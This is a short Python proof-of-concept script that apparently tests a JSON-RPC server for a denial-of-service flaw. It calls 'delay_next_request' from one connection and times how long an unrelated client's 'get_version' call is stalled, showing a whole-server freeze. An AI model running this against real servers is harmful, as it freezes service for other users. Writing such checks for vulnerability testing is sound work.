# Connection A (attacker) calls delay_next_request with `ms` then closes. Connection B (an
# unrelated client) then issues get_version; we time B. If B is stalled ~ms, the single asio
# thread was blocked on A's behalf -> whole-server freeze. Print B's blocked time in seconds.
# Run with: python3 -I delay.py <host> <port> <ms>
import socket, sys, json, time

host = sys.argv[1]
port = int(sys.argv[2])
ms = int(sys.argv[3])


def rpc(method, params=None, timeout=30):
    o = {"jsonrpc": "2.0", "id": 0, "method": method}
    if params is not None:
        o["params"] = params
    body = json.dumps(o).encode()
    hdr = ("POST / HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(hdr + body)
    d = b""
    while True:
        c = s.recv(65536)
        if not c:
            break
        d += c
    s.close()
    return d


# A: ask the server to delay the NEXT request (from anyone) by `ms`, on its own connection.
rpc("delay_next_request", {"ms": ms})
# B: a separate connection doing a trivial call; time how long it is held off.
t = time.time()
rpc("get_version")
dt = time.time() - t
print("BLOCKED_SECONDS=%.3f" % dt)
